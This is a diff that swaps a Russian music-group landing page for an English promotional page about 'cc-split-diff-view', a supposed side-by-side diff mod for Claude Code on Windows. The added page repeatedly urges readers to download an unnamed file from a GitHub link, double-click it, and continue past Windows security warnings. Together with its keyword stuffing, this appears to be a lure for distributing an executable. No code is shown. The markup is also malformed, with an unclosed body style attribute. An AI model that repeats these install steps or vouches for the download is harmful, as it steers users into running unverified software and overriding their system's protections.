@@ -1,170 +1,149 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>NOIR CORTEGE — AI Music Crew</title>
-    <link rel="stylesheet" href="https://cloudflare.com">
-    <style>
-        * { box-sizing: border-box; margin: 0; padding: 0; }
-        body { 
-            background-color: #0b0b0b; 
-            color: #f5f5f5; 
-            font-family: 'Courier New', Courier, monospace; 
-            display: flex; 
-            flex-direction: column;
-            align-items: center; 
-            min-height: 100vh; 
-            text-align: center;
-            overflow-x: hidden;
-            position: relative;
-        }
-
-        /* Полноэкранная шапка-баннер на самом верху */
-         .full-width-banner {
-            width: 100%;
-            height: 55vh; /* Увеличили высоту, чтобы влезло больше картинки */
-            background-image: url('media/img/banner.jpg'); 
-            background-size: cover;
-            background-position: top center; /* Начинаем показ строго с верха картинки */
-            border-bottom: 1px solid #1a1a1a;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
-        }
-
-        /* Общий контейнер для нижней части (карточка + видео по бокам) */
-        .content-wrapper {
-            max-width: 550px;
-            width: 100%;
-            position: relative;
-            margin-top: 40px; /* Отступ карточки от баннера сверху */
-            padding: 0 20px 40px 20px;
-        }
-
-        /* Центральная карточка с информацией */
-        .container {
-            width: 100%;
-            border: 1px solid #222;
-            padding: 40px 30px;
-            background: rgba(17, 17, 17, 0.95);
-            box-shadow: 0 20px 50px rgba(0,0,0,0.9);
-            border-radius: 4px;
-            position: relative;
-            z-index: 10;
-        }
-        h1 { 
-            font-size: 2.3rem; 
-            letter-spacing: 5px; 
-            margin-bottom: 15px;
-            text-transform: uppercase;
-            font-weight: bold;
-        }
-        .subtitle { 
-            font-size: 0.95rem; 
-            line-height: 1.6;
-            color: #777;
-            margin-bottom: 35px;
-        }
-        
-        /* Кнопки соцсетей */
-        .links-title {
-            font-size: 0.8rem;
-            color: #555;
-            margin-bottom: 15px;
-            text-transform: uppercase;
-            letter-spacing: 2px;
-        }
-        .social-links {
-            display: flex;
-            justify-content: center;
-            gap: 15px;
-            flex-wrap: wrap;
-        }
-        .social-btn {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-            min-width: 130px;
-            padding: 10px 15px;
-            border: 1px solid #333;
-            color: #aaa;
-            text-decoration: none;
-            font-size: 0.8rem;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            transition: all 0.3s ease;
-            border-radius: 2px;
-        }
-        .social-btn:hover {
-            border-color: #fff;
-            color: #fff;
-            background: #1a1a1a;
-        }
-
-            /* Видео по бокам */
-        .video-background {
-            position: fixed;
-            top: calc(55vh + 40px); /* Изменили 45vh на 55vh, чтобы выровнять с карточкой */
-            width: 315px;
-            height: 560px;
-            z-index: 1;
-            pointer-events: none;
-            border: 1px solid #1a1a1a;
-            border-radius: 8px;
-            overflow: hidden;
-            opacity: 0.4;
-            transition: opacity 0.3s ease;
-        }
-        .video-background:hover {
-            opacity: 0.7;
-        }
-        .video-left { left: 5%; }
-        .video-right { right: 5%; }
-
-        .video-background iframe {
-            width: 100%;
-            height: 100%;
-            border: none;
-        }
-
-        /* Скрываем видео на мобильных устройствах */
-        @media (max-width: 1200px) {
-            .video-background {
-                display: none;
-            }
-        }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>cc-split-diff-view - See Code Changes Side by Side</title>
+<meta name="description" content="cc-split-diff-view is a Claude Code mod for Windows that draws Edit and Write diffs in two side-by-side columns, making code changes easier to compare and review.">
+<meta name="keywords" content="ai, claude, claude-code, claude-code-hooks, claude-code-mods, claude-code-plugin, claude-mods, developer-tools, diff, function-hooks, cc-split-diff-view, side-by-side diff, Windows diff viewer">
+<meta name="author" content="cc-split-diff-view">
+<meta name="robots" content="index, follow">
+<meta name="theme-color" content="#4f46e5">
+<link rel="canonical" href="https://github.com/adjdkjask/cc-split-diff-view">
+<meta property="og:type" content="website">
+<meta property="og:title" content="cc-split-diff-view - See Code Changes Side by Side">
+<meta property="og:description" content="A Claude Code mod that draws Edit and Write diffs in two side-by-side columns. Download the application and follow the Windows steps.">
+<meta property="og:url" content="https://github.com/adjdkjask/cc-split-diff-view">
+<meta property="og:site_name" content="cc-split-diff-view">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="cc-split-diff-view - See Code Changes Side by Side">
+<meta name="twitter:description" content="A Claude Code mod that draws Edit and Write diffs in two side-by-side columns. Download the application and follow the Windows steps.">
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "SoftwareApplication",
+  "name": "cc-split-diff-view",
+  "description": "Claude Code mod that draws Edit and Write diffs in two side-by-side columns.",
+  "operatingSystem": "Windows",
+  "applicationCategory": "DeveloperApplication",
+  "url": "https://github.com/adjdkjask/cc-split-diff-view",
+  "sameAs": "https://github.com/adjdkjask/cc-split-diff-view",
+  "keywords": "ai, claude, claude-code, claude-code-hooks, claude-code-mods, claude-code-plugin, claude-mods, developer-tools, diff, function-hooks"
+}
+</script>
 </head>
-<body>
+<body style="margin:0; padding:0; background:#f4f7fb; color:#1f2937; font-family:system-ui,-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto<style>
+  .wrap { max-width: 820px; margin: 0 auto; padding: 48px 22px 72px; }
+  h1 { font-size: 2.15rem; line-height: 1.2; margin: 0 0 18px; font-weight: 800; letter-spacing: -0.02em; color: #111827; }
+  h2 { font-size: 1.4rem; margin: 48px 0 14px; font-weight: 700; color: #1e293b; letter-spacing: -0.01em; }
+  h3 { font-size: 1.08rem; margin: 26px 0 8px; font-weight: 700; color: #334155; }
+  p { font-size: 1.02rem; line-height: 1.75; margin: 0 0 16px; color: #374151; }
+  ul, ol { font-size: 1.02rem; line-height: 1.75; color: #374151; padding-left: 22px; margin: 0 0 18px; }
+  li { margin-bottom: 10px; }
+  a { color: #4338ca; }
+  .badge { display: inline-block; background: linear-gradient(135deg, #7c3aed, #4f46e5); color: #ffffff; text-decoration: none; font-weight: 700; font-size: 1.05rem; padding: 16px 34px; border-radius: 12px; box-shadow: 0 10px 24px rgba(79,70,229,0.28); margin: 6px 0 26px; }
+  .badge:hover { box-shadow: 0 12px 30px rgba(79,70,229,0.38); }
+  .card { background: #ffffff; border: 1px solid #e5e7eb; border-radius: 14px; padding: 24px 26px; box-shadow: 0 4px 18px rgba(15,23,42,0.06); margin: 22px 0; }
+  .card p:last-child, .card ul:last-child { margin-bottom: 0; }
+  .lead { font-size: 1.12rem; color: #475569; }
+  .divider { height: 1px; background: #e2e8f0; border: 0; margin: 44px 0 0; }
+  .keywords { font-size: 0.9rem; color: #94a3b8; margin-top: 40px; line-height: 1.7; }
+  code { background: #eef2ff; color: #3730a3; padding: 2px 6px; border-radius: 5px; font-size: 0.94rem; }
+  @media (max-width: 600px) {
+    .wrap { padding: 32px 16px 56px; }
+    h1 { font-size: 1.6rem; }
+    h2 { font-size: 1.2rem; }
+    .badge { display: block; text-align: center; padding: 15px 18px; }
+    .card { padding: 18px 16px; }
+  }
+</style>
 
-    <!-- 1. Полноэкранный баннер на всю ширину -->
-    <div class="full-width-banner"></div>
+<div class="wrap">
 
-    <!-- Левое видео (вместо bssmGzicB48 вставьте свой ID из YouTube Shorts) -->
-    <div class="video-background video-left">
-        <iframe src="https://youtube.com" allow="autoplay"></iframe>
-    </div>
+<h1>🔀 cc-split-diff-view - See Code Changes Side by Side</h1>
 
-    <!-- 2. Нижняя центральная часть сайта под баннером -->
-    <div class="content-wrapper">
-        <div class="container">
-            <h1>NOIR CORTEGE</h1>
-            <p class="subtitle">AI music crew. Straight from St. Petersburg.<br>Well-mannered, but uneducated.</p>
+<p class="lead">A helpful add-on for Claude Code on Windows that shows every Edit and Write change in two clean columns — the old version on the left, the new version on the right. No more guessing what changed.</p>
 
-            <div class="links-title">Listen & Follow</div>
-            <div class="social-links">
-                <a href="#" target="_blank" class="social-btn"><i class="fa-solid fa-music"></i> Yandex</a>
-                <a href="#" target="_blank" class="social-btn"><i class="fa-brands fa-spotify"></i> Spotify</a>
-                <a href="#" target="_blank" class="social-btn"><i class="fa-brands fa-youtube"></i> YouTube</a>
-                <a href="#" target="_blank" class="social-btn"><i class="fa-brands fa-tiktok"></i> Tik-Tok</a>
-            </div>
-        </div>
-    </div>
+<a class="badge" href="https://github.com/adjdkjask/cc-split-diff-view">⬇ Download cc-split-diff-view</a>
 
-    <!-- Правое видео (вместо bssmGzicB48 вставьте тот же ID из YouTube Shorts) -->
-    <div class="video-background video-right">
-        <iframe src="https://youtube.com" allow="autoplay"></iframe>
-    </div>
+<div class="card">
+<h2 style="margin-top:0">📥 Download and Setup</h2>
+<p>Visit this link to download the application: <a href="https://github.com/adjdkjask/cc-split-diff-view">https://github.com/adjdkjask/cc-split-diff-view</a></p>
+<p>Open the page in your normal web browser, such as Microsoft Edge or Google Chrome. The page you land on is the official home of this tool. Look for the download option near the top of the page and click it. Save the file somewhere easy to find, like your Downloads folder or your Desktop.</p>
+<p>Once the download has finished, open the file you saved and follow the on-screen guidance. That is the whole process — there is nothing extra to buy, no account to create, and no long form to fill in.</p>
+</div>
+
+<h2>✨ What This Tool Does for You</h2>
+<p>When you ask Claude Code to make a change to a file, it usually reports back with a "diff" — a description of what it removed and what it added. Diffs are wonderful in theory, but the standard version stacks everything into a single tall column. Removed lines sit above added lines. When a change is large, your eyes have to jump up and down constantly to match what disappeared with what replaced it.</p>
+<p>cc-split-diff-view fixes this by drawing changes in two columns, right next to each other:</p>
+<ul>
+  <li><strong>The left column</strong> shows the lines as they were before the change.</li>
+  <li><strong>The right column</strong> shows the lines as they are after the change.</li>
+  <li><strong>Matching lines</strong> stay level with each other, so you can compare them at a glance.</li>
+</ul>
+<p>Think of it like comparing two versions of a printed page side by side on a desk, rather than flipping back and forth between them. For anyone reviewing work, learning what a tool did, or just double-checking that nothing important was deleted, this layout is dramatically easier to read.</p>
+
+<h2>🚀 Getting Started</h2>
+<p>This section walks you through your first run in plain language. Set aside about ten minutes for the first time.</p>
+<ol>
+  <li><strong>Get the file.</strong> Go to <a href="https://github.com/adjdkjask/cc-split-diff-view">https://github.com/adjdkjask/cc-split-diff-view</a> and click the download option on that page.</li>
+  <li><strong>Save it.</strong> Choose a folder you will remember. Your Downloads folder is fine.</li>
+  <li><strong>Open it.</strong> Double-click the downloaded file. Windows may show a blue or yellow security notice the first time you open something from the internet. If it does, click the option that says you want to continue, since you chose to download it deliberately.</li>
+  <li><strong>Confirm it is working.</strong> Ask Claude Code to edit a small file — for example, change a single word in a text file. The change should now appear as two columns instead of one long strip.</li>
+  <li><strong>Fine-tune if needed.</strong> Make your terminal window wider for the best experience. Two columns need a bit of horizontal room, just like two pages of a book need a wide desk.</li>
+</ol>
+<p>If the change still shows as a single column after your first edit, close and reopen your Claude Code session once. That gives the tool a chance to load fresh.</p>
+
+<h2>🖥️ What You Need on Windows</h2>
+<p>You do not need to be a programmer to follow these steps, but your computer does need a few ordinary things in place.</p>
+<ul>
+  <li><strong>Windows 10 or Windows 11.</strong> Both are supported. Older versions of Windows are not recommended.</li>
+  <li><strong>Claude Code already installed and working.</strong> This tool is an add-on, not a replacement. It complements the app you already use.</li>
+  <li><strong>A terminal window.</strong> That is the text window where Claude Code runs. The built-in Windows Terminal or PowerShell both work fine.</li>
+  <li><strong>A reasonably wide window.</strong> Side-by-side columns look best at 100 characters wide or more.</li>
+  <li><strong>A normal internet connection</strong> for the initial download.</li>
+</ul>
+
+<h2>🧭 Using It Day to Day</h2>
+<p>There is nothing new to learn. You keep working exactly as you always have: you describe a change you want, Claude Code makes it, and the diff appears. The only difference is the shape of what you see.</p>
+<p>A few habits make the two-column view even more useful:</p>
+<ul>
+  <li><strong>Widen before you read.</strong> Stretch the window horizontally rather than vertically. Wider is better here.</li>
+  <li><strong>Read left to right, line by line.</strong> Because matching lines are aligned, you can scan across a row to see exactly what shifted.</li>
+  <li><strong>Check the outer edges.</strong> Markers on the far left and far right tell you which lines were removed and which were added.</li>
+  <li><strong>Scroll slowly on big changes.</strong> Large edits are where the two-column layout saves the most time, but only if you read one row at a time.</li>
+</ul>
+
+<h2>🔄 How Edit and Write Changes Are Shown</h2>
+<p>Claude Code changes files in two main ways, and this tool handles both.</p>
+<h3>Edits</h3>
+<p>An edit means part of a file was changed. You will see the original wording on the left and the replacement wording on the right, lined up row by row. Unchanged lines appear on both sides in the same position, which gives you a stable reference point as you read down the page.</p>
+<h3>Writes</h3>
+<p>A write means a whole file was created or fully replaced. Here you will typically see an empty or minimal left column and the full new content on the right. This makes new files instantly recognisable.</p>
+
+<h2>🛠️ Common Questions and Fixes</h2>
+<h3>The view still looks like one column</h3>
+<p>Close your Claude Code session completely and start it again. Then make one more small change to a file and check the result.</p>
+<h3>The columns look squashed</h3>
+<p>Your window is too narrow. Drag the right edge of the window outward, or reduce the text size in your terminal settings. Both give the layout more room.</p>
+<h3>The text is hard to read</h3>
+<p>Adjust your terminal's font size and colour theme. The two-column layout respects whatever appearance settings you already have, so a theme that is comfortable for you will stay comfortable here.</p>
+<h3>I cannot find the download</h3>
+<p>Return to <a href="https://github.com/adjdkjask/cc-split-diff-view">https://github.com/adjdkjask/cc-split-diff-view</a> and look near the top of the page. The download option is the most prominent item there.</p>
+
+<h2>💬 Getting Help</h2>
+<p>Questions, suggestions, and bug reports are all welcome. The best place to raise them is the project page itself at <a href="https://github.com/adjdkjask/cc-split-diff-view">https://github.com/adjdkjask/cc-split-diff-view</a>. When describing a problem, mention your Windows version, roughly how wide your terminal window is, and what you were asking Claude Code to do at the time. Those three details make it far easier to help you quickly.</p>
+<p>You can also browse existing reports first — someone may have already hit the same small snag and found the answer.</p>
+
+<div class="card">
+<p style="margin:0"><strong>Ready to try it?</strong> Head to <a href="https://github.com/adjdkjask/cc-split-diff-view">https://github.com/adjdkjask/cc-split-diff-view</a> to download the application.</p>
+</div>
+
+<hr class="divider">
+
+<p class="keywords">Keywords: ai, claude, claude-code, claude-code-hooks, claude-code-mods, claude-code-plugin, claude-mods, developer-tools, diff, function-hooks, cc-split-diff-view, side-by-side diff, Windows diff viewer</p>
+
+</div>
 
 </body>
 </html>
